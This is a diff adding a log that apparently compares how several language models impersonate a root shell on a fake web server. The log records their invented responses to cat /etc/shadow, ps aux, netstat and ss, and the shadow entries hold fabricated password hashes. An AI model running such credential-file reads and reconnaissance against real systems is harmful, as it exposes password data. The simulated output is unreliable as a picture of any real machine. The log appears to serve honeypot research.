+sync:*:19457:0:99999:7:::
+games:*:19457:0:99999:7:::
+man:*:19457:0:99999:7:::
+lp:*:19457:0:99999:7:::
+mail:*:19457:0:99999:7:::
+news:*:19457:0:99999:7:::
+uucp:*:19457:0:99999:7:::
+proxy:*:19457:0:99999:7:::
+www-data:*:19457:0:99999:7:::
+backup:*:19457:0:99999:7:::
+list:*:19457:0:99999:7:::
+irc:*:19457:0:99999:7:::
+gnats:*:19457:0:99999:7:::
+nobody:*:19457:0:99999:7:::
+_apt:*:19457:0:99999:7:::
+systemd-timesync:*:19457:0:99999:7:::
+systemd-network:*:19457:0:99999:7:::
+systemd-resolve:*:19457:0:99999:7:::
+messagebus:*:19457:0:99999:7:::
+sshd:*:19457:0:99999:7:::
+... lines removed for brevity ...
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 5-llama.txt ---
+
+
+========================================
+--- START OF: 5-sonnet.txt ---
+========================================
+
+5-sonnet.txt
+Command: cat /etc/shadow
+Response Time: 13.19 seconds
+
+Response:
+root:$6$QxGKqRt5vN$mH4xN.8s7VJJ6KqZKl0y3Ln0FZKv4hN2dH8N.3J6L0Zy5xQn7R8sT9uV0wX1yZ2aB3cD4eF5gH6iJ7kL8mN9oP:19387:0:99999:7:::
+daemon:*:19387:0:99999:7:::
+bin:*:19387:0:99999:7:::
+sys:*:19387:0:99999:7:::
+sync:*:19387:0:99999:7:::
+games:*:19387:0:99999:7:::
+man:*:19387:0:99999:7:::
+lp:*:19387:0:99999:7:::
+mail:*:19387:0:99999:7:::
+news:*:19387:0:99999:7:::
+uucp:*:19387:0:99999:7:::
+proxy:*:19387:0:99999:7:::
+www-data:*:19387:0:99999:7:::
+backup:*:19387:0:99999:7:::
+list:*:19387:0:99999:7:::
+irc:*:19387:0:99999:7:::
+gnats:*:19387:0:99999:7:::
+nobody:*:19387:0:99999:7:::
+systemd-network:*:19387:0:99999:7:::
+systemd-resolve:*:19387:0:99999:7:::
+systemd-timesync:*:19387:0:99999:7:::
+messagebus:*:19387:0:99999:7:::
+syslog:*:19387:0:99999:7:::
+_apt:*:19387:0:99999:7:::
+sshd:*:19387:0:99999:7:::
+ubuntu:$6$rounds=4096$jKqV8eH9$dL.j5Y3nU2F8pW0rQ1sT2vX3wZ4aB5cD6eF7gH8iJ9kL0mN1oP2qR3sT4uV5wX6yZ7aB8cD9eF0gH1iJ2kL3m:19389:0:99999:7:::
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 5-sonnet.txt ---
+
+
+========================================
+--- START OF: 6-deepseek.txt ---
+========================================
+
+6-deepseek.txt
+Command: cat /etc/os-release
+Response Time: 30.33 seconds
+
+Response:
+NAME="Ubuntu"
+VERSION="22.04.1 LTS (Jammy Jellyfish)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 22.04.1 LTS"
+VERSION_ID="22.04"
+HOME_URL="https://www.ubuntu.com/"
+SUPPORT_URL="https://help.ubuntu.com/"
+BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
+PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
+VERSION_CODENAME=jammy
+UBUNTU_CODENAME=jammy
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 6-deepseek.txt ---
+
+
+========================================
+--- START OF: 6-gemini.txt ---
+========================================
+
+6-gemini.txt
+Command: cat /etc/os-release
+Response Time: 9.42 seconds
+
+Response:
+PRETTY_NAME="Ubuntu 22.04.2 LTS"
+NAME="Ubuntu"
+VERSION_ID="22.04"
+VERSION="22.04.2 LTS (Jammy Jellyfish)"
+VERSION_CODENAME=jammy
+ID=ubuntu
+ID_LIKE=debian
+HOME_URL="https://www.ubuntu.com/"
+SUPPORT_URL="https://help.ubuntu.com/"
+BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
+PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
+UBUNTU_CODENAME=jammy
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 6-gemini.txt ---
+
+
+========================================
+--- START OF: 6-gpt.txt ---
+========================================
+
+6-gpt.txt
+Command: cat /etc/os-release
+Response Time: 11.70 seconds
+
+Response:
+NAME="Ubuntu"
+VERSION="22.04.1 LTS (Jammy Jellyfish)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 22.04.1 LTS"
+VERSION_ID="22.04"
+HOME_URL="https://www.ubuntu.com/"
+SUPPORT_URL="https://help.ubuntu.com/"
+BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
+PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
+VERSION_CODENAME=jammy
+UBUNTU_CODENAME=jammy
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 6-gpt.txt ---
+
+
+========================================
+--- START OF: 6-llama.txt ---
+========================================
+
+6-llama.txt
+Command: cat /etc/os-release
+Response Time: 6.64 seconds
+
+Response:
+PRETTY_NAME="Ubuntu 22.04.1 LTS"
+NAME="Ubuntu"
+VERSION_ID="22.04"
+VERSION="22.04.1 LTS (Jammy Jellyfish)"
+VERSION_CODENAME=jammy
+ID=ubuntu
+ID_LIKE=debian
+HOME_URL="https://www.ubuntu.com/"
+SUPPORT_URL="https://help.ubuntu.com/"
+BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
+PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
+UBUNTU_CODENAME=jammy
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 6-llama.txt ---
+
+
+========================================
+--- START OF: 6-sonnet.txt ---
+========================================
+
+6-sonnet.txt
+Command: cat /etc/os-release
+Response Time: 6.23 seconds
+
+Response:
+NAME="Ubuntu"
+VERSION="22.04.1 LTS (Jammy Jellyfish)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 22.04.1 LTS"
+VERSION_ID="22.04"
+HOME_URL="https://www.ubuntu.com/"
+SUPPORT_URL="https://help.ubuntu.com/"
+BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
+PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
+VERSION_CODENAME=jammy
+UBUNTU_CODENAME=jammy
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 6-sonnet.txt ---
+
+
+========================================
+--- START OF: 7-deepseek.txt ---
+========================================
+
+7-deepseek.txt
+Command: ps aux
+Response Time: 96.74 seconds
+
+Response:
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.1 168000  8000 ?        Ss   Jan01   0:02 /sbin/init splash
+root       456  0.0  0.2 123456 12000 ?        Ss   Jan01   0:01 /usr/sbin/sshd -D
+root       789  0.0  0.1  98765  6000 ?        Ss   Jan01   0:00 /usr/sbin/cron -f
+syslog     123  0.0  0.1  54321  4000 ?        Ssl  Jan01   0:01 /usr/sbin/rsyslogd -n
+www-data  4567  0.1  1.5 234567 89000 ?        S    Jan01   1:23 nginx: worker process
+www-data  4568  0.1  1.5 234567 89000 ?        S    Jan01   1:22 nginx: worker process
+root      5000  0.0  0.0  12345  2000 ?        S    10:30   0:00 -bash
+root      6000  0.0  0.0  12345  1000 ?        S    Jan01   0:00 sleep 60
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 7-deepseek.txt ---
+
+
+========================================
+--- START OF: 7-gemini.txt ---
+========================================
+
+7-gemini.txt
+Command: ps aux
+Response Time: 23.59 seconds
+
+Response:
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           1  0.0  0.1 169904 12936 ?        Ss   Jan15   0:09 /sbin/init
+root           2  0.0  0.0      0     0 ?        S    Jan15   0:00 [kthreadd]
+root           3  0.0  0.0      0     0 ?        I<   Jan15   0:00 [rcu_gp]
+root           4  0.0  0.0      0     0 ?        I<   Jan15   0:00 [rcu_par_gp]
+...
+root         421  0.0  0.0   2608   820 ?        Ss   Jan15   0:00 /usr/sbin/cron -f
+syslog       423  0.0  0.1 229124  8188 ?        Ssl  Jan15   0:15 /usr/sbin/rsyslogd -n
+root         425  0.0  0.1 827980 10212 ?        Ssl  Jan15   0:45 /usr/lib/snapd/snapd
+root         452  0.0  0.2 189884 19524 ?        Ssl  Jan15   0:21 /usr/bin/python3 /usr/bin/fail2ban-server -xf start
+root         578  0.0  0.0  12824  3448 ?        Ss   Jan15   0:03 /usr/sbin/sshd -D
+root         582  0.0  0.1 183884 10048 ?        Ssl  Jan15   0:02 /usr/lib/accountsservice/accounts-daemon
+message+     583  0.0  0.0   8920  3444 ?        Ss   Jan15   0:03 @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+root         588  0.0  0.3 301284 28620 ?        Ssl  Jan15   0:28 /usr/lib/polkit-1/polkitd --no-debug
+systemd+     611  0.0  0.0  27520  6992 ?        Ss   Jan15   0:01 /lib/systemd/systemd-resolved
+nginx        801  0.0  0.2 166716 17120 ?        S    Jan15   0:01 nginx: worker process
+nginx        802  0.0  0.2 166716 17120 ?        S    Jan15   0:01 nginx: worker process
+root         810  0.0  0.0 166460  6248 ?        Ss   Jan15   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
+mysql      10542  0.2  4.8 2259160 389148 ?      Ssl  10:18   1:12 /usr/sbin/mysqld
+root       23488  0.0  0.1  13088  7012 ?        Ss   11:30   0:00 sshd: root@notty
+root       23555  0.0  0.0   7448  3512 ?        S    11:30   0:00 /usr/sbin/postdrop -r
+root       29123  0.0  0.0   2608  1788 ?        S    12:01   0:00 /usr/sbin/CRON -f
+root       29124  0.0  0.0   2608  1788 ?        S    12:01   0:00 /usr/sbin/CRON -f
+root       29125  0.0  0.0   3916  3024 ?        Ss   12:01   0:00 /bin/sh -c /usr/lib/update-notifier/apt-check --human-readable
+root       29130  0.0  0.2  44036 17208 ?        S    12:01   0:00 /usr/bin/python3 /usr/lib/update-notifier/apt-check --human-readable
+root       31127  0.0  0.1  13088  6988 ?        Ss   12:14   0:00 sshd: root@notty
+root       31189  0.0  0.0   9164  3980 ?        R+   12:14   0:00 ps aux
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 7-gemini.txt ---
+
+
+========================================
+--- START OF: 7-gpt.txt ---
+========================================
+
+7-gpt.txt
+Command: ps aux
+Response Time: 65.02 seconds
+
+Response:
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           1  0.0  0.1 168776 13612 ?        Ss   Oct14   0:09 /sbin/init splash
+root           2  0.0  0.0      0     0 ?        S    Oct14   0:00 [kthreadd]
+root           3  0.0  0.0      0     0 ?        I    Oct14   0:00 [rcu_gp]
+root           4  0.0  0.0      0     0 ?        I    Oct14   0:00 [rcu_par_gp]
+root           6  0.0  0.0      0     0 ?        I<   Oct14   0:00 [kworker/0:0H-events_highpri]
+root           9  0.0  0.0      0     0 ?        I    Oct14   0:01 [kworker/u16:0-events_unbound]
+root          10  0.0  0.0      0     0 ?        S    Oct14   0:00 [ksoftirqd/0]
+root          11  0.0  0.0      0     0 ?        I    Oct14   0:03 [rcu_sched]
+root          12  0.0  0.0      0     0 ?        S    Oct14   0:00 [migration/0]
+root          13  0.0  0.0      0     0 ?        S    Oct14   0:00 [cpuhp/0]
+root          29  0.0  0.0      0     0 ?        S    Oct14   0:00 [kdevtmpfs]
+root         143  0.0  0.0      0     0 ?        I<   Oct14   0:00 [kworker/1:0H-kblockd]
+root         244  0.0  0.0      0     0 ?        I    Oct14   0:02 [kworker/0:1-events]
+systemd+     328  0.1  0.3 197804 27836 ?        Ssl  Oct14   8:30 /lib/systemd/systemd-journald
+root         412  0.0  0.1  18024  8328 ?        Ss   Oct14   0:00 /lib/systemd/systemd-udevd
+systemd+     560  0.0  0.1  22360  9780 ?        S    Oct14   0:02 /lib/systemd/systemd-timesyncd
+systemd+     600  0.0  0.1  88984  9852 ?        Ssl  Oct14   0:06 /lib/systemd/systemd-networkd
+systemd+     620  0.0  0.1  93444 10420 ?        Ssl  Oct14   0:14 /lib/systemd/systemd-resolved
+polkitd      702  0.0  0.2 943044 18820 ?        Ssl  Oct14   0:00 /usr/lib/policykit-1/polkitd --no-debug
+root         704  0.0  0.0  28464  4776 ?        Ss   Oct14   0:00 /usr/sbin/acpid
+root         706  0.0  0.0  10628  3232 ?        Ss   Oct14   0:00 /usr/sbin/atd -f
+root         708  0.0  0.1 105176 10844 ?        Ss   Oct14   0:00 /lib/systemd/systemd-logind
+syslog       710  0.0  0.1 221888 11028 ?        Ssl  Oct14   0:04 /usr/sbin/rsyslogd -n -iNONE
+message+     716  0.0  0.1  93416 10384 ?        Ss   Oct14   0:02 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+root         720  0.0  0.1  26324  9196 ?        Ss   Oct14   0:00 /usr/sbin/cron -f
+root         884  0.0  0.3 1716948 27820 ?       Ssl  Oct14   0:27 /usr/lib/snapd/snapd
+root         930  0.0  0.0  17528  7112 ?        Ss   Oct14   0:01 /usr/sbin/sshd -D
+root        1118  0.0  0.0  21076  6804 ?        Ss   Oct14   0:00 nginx: master process /usr/sbin/nginx -g daemon off;
+www-data    1120  0.0  0.1  21076  9800 ?        S    Oct14   0:00 nginx: worker process
+www-data    1121  0.0  0.1  21076  9728 ?        S    Oct14   0:00 nginx: worker process
+root        1200  0.0  0.2 344560 21560 ?        Ss   Oct14   0:05 php-fpm: master process (/etc/php/8.1/fpm/php-fpm.conf)
+www-data    1201  0.0  0.1 344560 14000 ?        S    Oct14   0:22 php-fpm: pool www
+www-data    1202  0.0  0.1 344560 14220 ?        S    Oct14   0:20 php-fpm: pool www
+root        1308  0.0  0.0  17476  6620 ?        Ss   Oct14   0:00 /usr/sbin/haveged --Foreground --verbose=1
+root        1602  0.0  0.0      0     0 ?        I    Oct20   0:00 [kworker/1:1-events]
+root        2010  0.0  0.0      0     0 ?        I<   Oct14   0:00 [kworker/2:0H-kblockd]
+root        2244  0.0  0.0      0     0 ?        I    Oct19   0:01 [kworker/u16:2-events_unbound]
+root        2608  0.0  0.0      0     0 ?        I    10:59   0:00 [kworker/0:0-events]
+root        2972  0.0  0.0      0     0 ?        I    11:03   0:00 [kworker/1:2-events]
+root        3104  0.0  0.0      0     0 ?        I    11:05   0:00 [kworker/0:2-events]
+root        3358  0.0  0.0      0     0 ?        I    11:08   0:00 [kworker/1:3-events]
+root        3720  0.0  0.0      0     0 ?        I    11:12   0:00 [kworker/u16:1-events_unbound]
+root        5312  0.0  0.0      0     0 ?        I<   Oct14   0:00 [kworker/3:0H-kblockd]
+root        6890  0.0  0.0      0     0 ?        I    11:16   0:00 [kworker/3:1-events]
+root        7448  0.0  0.0      0     0 ?        I    11:17   0:00 [kworker/2:1-events]
+root        8120  0.0  0.0      0     0 ?        I    11:18   0:00 [kworker/3:2-events]
+root        9012  0.0  0.0      0     0 ?        I    11:19   0:00 [kworker/2:2-events]
+root        9876  0.0  0.0      0     0 ?        I    11:20   0:00 [kworker/3:0-events]
+root       12044  0.0  0.0      0     0 ?        I    11:20   0:00 [kworker/1:0-events]
+root       14588  0.0  0.0      0     0 ?        I    11:21   0:00 [kworker/0:1-events]
+root       15672  0.0  0.0      0     0 ?        I    11:21   0:00 [kworker/2:0-events]
+root       16740  0.0  0.0      0     0 ?        I    11:21   0:00 [kworker/u16:3-events_unbound]
+root       18012  0.0  0.0      0     0 ?        I    11:22   0:00 [kworker/1:1H-kblockd]
+root       19664  0.0  0.0      0     0 ?        I    11:22   0:00 [kworker/0:3-events]
+root       20532  0.0  0.0 19808  8912 ?        Ss   11:21   0:00 sshd: root@notty
+root       20533  0.0  0.0  11692  4768 ?        S    11:21   0:00 -bash
+root       20618  0.0  0.0  11136  3648 ?        R    11:22   0:00 ps aux
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 7-gpt.txt ---
+
+
+========================================
+--- START OF: 7-llama.txt ---
+========================================
+
+7-llama.txt
+Command: ps aux
+Response Time: 13.17 seconds
+
+Response:
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           1  0.0  0.2 169128 11280 ?        Ss   Jan05   0:05 /sbin/init
+root           2  0.0  0.0      0     0 ?        S    Jan05   0:00 [kthreadd]
+...
+sshd        1234  0.0  0.1  72312  4200 ?        Ss   Jan10   0:00 sshd: root [priv]
+root        6789  0.0  0.1  74440  5600 ?        Ss   14:30   0:00 sshd: root@notty
+root        6790  0.0  0.0  28880  2824 ?        Ss   14:30   0:00 -bash
+root        6803  0.0  0.0  38304  3300 ?        R    14:30   0:00 ps aux
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 7-llama.txt ---
+
+
+========================================
+--- START OF: 7-sonnet.txt ---
+========================================
+
+7-sonnet.txt
+Command: ps aux
+Response Time: 17.37 seconds
+
+Response:
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           1  0.0  0.2 168756 11832 ?        Ss   Jan15   0:12 /sbin/init
+root           2  0.0  0.0      0     0 ?        S    Jan15   0:00 [kthreadd]
+root           3  0.0  0.0      0     0 ?        I<   Jan15   0:00 [rcu_gp]
+root           4  0.0  0.0      0     0 ?        I<   Jan15   0:00 [rcu_par_gp]
+root         450  0.0  0.1  29008  9344 ?        Ss   Jan15   0:02 /lib/systemd/systemd-journald
+root         481  0.0  0.1  22392  6208 ?        Ss   Jan15   0:01 /lib/systemd/systemd-udevd
+systemd+     682  0.0  0.0  16496  7104 ?        Ss   Jan15   0:15 /lib/systemd/systemd-resolved
+root         715  0.0  0.1 239360  8896 ?        Ssl  Jan15   0:08 /usr/sbin/rsyslogd -n -iNONE
+root         721  0.0  0.2  16720  9472 ?        Ss   Jan15   0:00 /lib/systemd/systemd-logind
+root         738  0.0  0.4 1326948 17984 ?       Ssl  Jan15   0:23 /usr/bin/containerd
+root         812  0.0  0.1  15520  7936 ?        Ss   Jan15   0:00 /sbin/dhclient -4 -v -i -pf /run/dhclient.eth0.pid
+root         894  0.0  0.5 107900 22784 ?        Ss   Jan15   0:03 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+www-data    1024  0.0  0.8 563824 35264 ?        S    Jan15   2:14 nginx: worker process
+www-data    1025  0.0  0.9 564848 37408 ?        S    Jan15   2:18 nginx: worker process
+www-data    1026  0.0  0.8 563568 34816 ?        S    Jan15   2:12 nginx: worker process
+www-data    1027  0.0  0.8 564112 35392 ?        S    Jan15   2:15 nginx: worker process
+root        1023  0.0  0.2 562240 11520 ?        Ss   Jan15   0:01 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
+mysql       1156  0.8  8.4 2095648 342816 ?      Ssl  Jan15  38:24 /usr/sbin/mysqld
+root        1892  0.0  0.3  16912 12672 ?        Ss   09:23   0:00 sshd: root@notty
+root        1906  0.0  0.1   7388  4096 ?        Ss   09:23   0:00 /bin/bash
+root        2104  0.0  0.0   9396  3200 ?        R+   09:47   0:00 ps aux
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 7-sonnet.txt ---
+
+
+========================================
+--- START OF: 8-deepseek.txt ---
+========================================
+
+8-deepseek.txt
+Command: netstat -antup
+Response Time: 27.85 seconds
+
+Response:
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      852/sshd            
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1234/nginx          
+tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      1234/nginx          
+tcp        0      0 10.0.1.5:22             203.0.113.45:49218      ESTABLISHED 2567/sshd: root [priv]
+tcp6       0      0 :::22                   :::*                    LISTEN      852/sshd            
+udp        0      0 0.0.0.0:123             0.0.0.0:*                           456/ntpd            
+udp        0      0 10.0.1.5:68             10.0.1.1:67             ESTABLISHED -                   
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 8-deepseek.txt ---
+
+
+========================================
+--- START OF: 8-gemini.txt ---
+========================================
+
+8-gemini.txt
+Command: netstat -antup
+Response Time: 20.03 seconds
+
+Response:
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1158/nginx: master
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      982/sshd
+tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      1158/nginx: master
+tcp        0      0 192.0.2.55:22           198.51.100.87:51822     ESTABLISHED 14322/sshd: root@notty
+tcp        0      0 192.0.2.55:443          104.18.32.211:41334     ESTABLISHED 1159/nginx: worker
+tcp        0      0 192.0.2.55:443          203.0.113.10:60123      TIME_WAIT   -
+tcp        0      0 192.0.2.55:443          108.162.216.44:34812    ESTABLISHED 1159/nginx: worker
+tcp6       0      0 :::80                   :::*                    LISTEN      1158/nginx: master
+tcp6       0      0 :::22                   :::*                    LISTEN      982/sshd
+tcp6       0      0 :::443                  :::*                    LISTEN      1158/nginx: master
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           765/systemd-resolve
+udp        0      0 192.0.2.55:68           0.0.0.0:*                           654/dhclient
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 8-gemini.txt ---
+
+
+========================================
+--- START OF: 8-gpt.txt ---
+========================================
+
+8-gpt.txt
+Command: netstat -antup
+Response Time: 54.85 seconds
+
+Response:
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      741/sshd
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1023/nginx: master process /usr/sbin/nginx
+tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      1023/nginx: master process /usr/sbin/nginx
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      893/mysqld
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      531/systemd-resolved
+tcp        0      0 10.14.8.23:22           198.51.100.23:57112     ESTABLISHED 1621/sshd: root
+tcp        0      0 203.0.113.42:443        203.0.113.55:52345      ESTABLISHED 2045/nginx: worker process
+tcp        0      0 127.0.0.1:58724         127.0.0.1:3306          ESTABLISHED 2150/php-fpm: pool www
+tcp        0      0 127.0.0.1:3306          127.0.0.1:58724         ESTABLISHED 893/mysqld
+tcp6       0      0 :::22                   :::*                    LISTEN      741/sshd
+tcp6       0      0 :::80                   :::*                    LISTEN      1023/nginx: master process /usr/sbin/nginx
+tcp6       0      0 :::443                  :::*                    LISTEN      1023/nginx: master process /usr/sbin/nginx
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           531/systemd-resolved
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           360/systemd-networkd
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 8-gpt.txt ---
+
+
+========================================
+--- START OF: 8-llama.txt ---
+========================================
+
+8-llama.txt
+Command: netstat -antup
+Response Time: 18.20 seconds
+
+Response:
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      648/systemd-resolve 
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      748/sshd: /usr/sbin 
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      824/nginx: master  
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      752/mysqld          
+tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      824/nginx: master  
+tcp        0    240 172.16.0.101:22         173.239.43.22:50735     ESTABLISHED 1376/sshd: root [pr 
+tcp6       0      0 :::22                   :::*                    LISTEN      748/sshd: /usr/sbin 
+tcp6       0      0 :::80                   :::*                    LISTEN      824/nginx: master  
+tcp6       0      0 :::443                  :::*                    LISTEN      824/nginx: master  
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           648/systemd-resolve 
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 8-llama.txt ---
+
+
+========================================
+--- START OF: 8-sonnet.txt ---
+========================================
+
+8-sonnet.txt
+Command: netstat -antup
+Response Time: 11.23 seconds
+
+Response:
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1243/nginx: master  
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      891/sshd: /usr/sbin 
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      1189/mysqld         
+tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      1243/nginx: master  
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      678/systemd-resolve 
+tcp        0    256 10.142.0.15:22          203.0.113.45:54782      ESTABLISHED 3421/sshd: root [pr 
+tcp        0      0 10.142.0.15:443         198.51.100.73:42156     ESTABLISHED 1255/nginx: worker  
+tcp        0      0 10.142.0.15:443         192.0.2.88:38947        ESTABLISHED 1256/nginx: worker  
+tcp6       0      0 :::80                   :::*                    LISTEN      1243/nginx: master  
+tcp6       0      0 :::22                   :::*                    LISTEN      891/sshd: /usr/sbin 
+tcp6       0      0 :::443                  :::*                    LISTEN      1243/nginx: master  
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           678/systemd-resolve 
+udp        0      0 10.142.0.15:68          0.0.0.0:*                           654/systemd-network 
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 8-sonnet.txt ---
+
+
+========================================
+--- START OF: 9-deepseek.txt ---
+========================================
+
+9-deepseek.txt
+Command: ss -antup
+Response Time: 67.72 seconds
+
+Response:
+Netid  State      Recv-Q Send-Q Local Address:Port    Peer Address:Port    Process  
+tcp    LISTEN     0      128    0.0.0.0:22            0.0.0.0:*            users:(("sshd",pid=1234,fd=3))  
+tcp    ESTAB      0      0      192.168.1.10:22       203.0.113.100:54321  users:(("sshd",pid=5678,fd=3))  
+tcp    LISTEN     0      511    0.0.0.0:80            0.0.0.0:*            users:(("nginx",pid=9012,fd=6))  
+tcp    LISTEN     0      511    0.0.0.0:443           0.0.0.0:*            users:(("nginx",pid=9012,fd=7))  
+udp    UNCONN     0      0      0.0.0.0:68            0.0.0.0:*            users:(("dhclient",pid=3456,fd=6))  
+
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 9-deepseek.txt ---
+
+
+========================================
+--- START OF: 9-gemini.txt ---
+========================================
+
+9-gemini.txt
+Command: ss -antup
+Response Time: 6.31 seconds
+
+Response:
+Netid  State   Recv-Q  Send-Q    Local Address:Port      Peer Address:Port  Process
+tcp    LISTEN  0       4096      127.0.0.53%lo:53       0.0.0.0:*      users:(("systemd-resolve",pid=987,fd=13))
+tcp    LISTEN  0       128           0.0.0.0:22         0.0.0.0:*      users:(("sshd",pid=1121,fd=3))
+tcp    LISTEN  0       511           0.0.0.0:80         0.0.0.0:*      users:(("nginx",pid=1345,fd=6),("nginx",pid=1344,fd=6))
+tcp    LISTEN  0       511           0.0.0.0:443        0.0.0.0:*      users:(("nginx",pid=1345,fd=7),("nginx",pid=1344,fd=7))
+tcp    ESTAB   0       0        172.16.10.15:22     72.21.91.29:54321  users:(("sshd",pid=2345,fd=3),("sshd",pid=2301,fd=3))
+tcp    ESTAB   0       0        172.16.10.15:443   208.80.154.224:12876 users:(("nginx",pid=1345,fd=8))
+tcp    ESTAB   0       0        172.16.10.15:443   104.28.243.199:34562 users:(("nginx",pid=1344,fd=9))
+tcp    ESTAB   0       0        172.16.10.15:80    66.249.79.132:45980  users:(("nginx",pid=1345,fd=10))
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 9-gemini.txt ---
+
+
+========================================
+--- START OF: 9-gpt.txt ---
+========================================
+
+9-gpt.txt
+Command: ss -antup
+Response Time: 34.86 seconds
+
+Response:
+Netid  State   Recv-Q  Send-Q   Local Address:Port        Peer Address:Port        Process
+tcp    LISTEN  0       128      0.0.0.0:22               0.0.0.0:*                users:(("sshd",pid=747,fd=3))
+tcp    LISTEN  0       511      0.0.0.0:80               0.0.0.0:*                users:(("nginx",pid=912,fd=6),("nginx",pid=911,fd=6))
+tcp    LISTEN  0       511      [::]:80                  [::]:*                   users:(("nginx",pid=912,fd=7),("nginx",pid=911,fd=7))
+tcp    LISTEN  0       511      0.0.0.0:443              0.0.0.0:*                users:(("nginx",pid=912,fd=8),("nginx",pid=911,fd=8))
+tcp    LISTEN  0       511      [::]:443                 [::]:*                   users:(("nginx",pid=912,fd=9),("nginx",pid=911,fd=9))
+tcp    LISTEN  0       128      127.0.0.1:5432           0.0.0.0:*                users:(("postgres",pid=1045,fd=5))
+tcp    LISTEN  0       128      127.0.0.1:6379           0.0.0.0:*                users:(("redis-server",pid=1002,fd=6))
+tcp    LISTEN  0       4096     127.0.0.53%lo:53         0.0.0.0:*                users:(("systemd-resolved",pid=633,fd=13))
+tcp    LISTEN  0       128      [::]:22                  [::]:*                   users:(("sshd",pid=747,fd=4))
+tcp    LISTEN  0       128      127.0.0.1:3000           0.0.0.0:*                users:(("node",pid=1501,fd=27))
+tcp    ESTAB   0       0        10.0.3.12:22             203.0.113.15:53442       users:(("sshd",pid=1189,fd=4))
+tcp    ESTAB   0       0        127.0.0.1:56522          127.0.0.1:3000           users:(("nginx",pid=919,fd=18))
+tcp    ESTAB   0       0        127.0.0.1:56524          127.0.0.1:5432           users:(("node",pid=1501,fd=31))
+udp    UNCONN  0       0        127.0.0.53%lo:53         0.0.0.0:*                users:(("systemd-resolved",pid=633,fd=12))
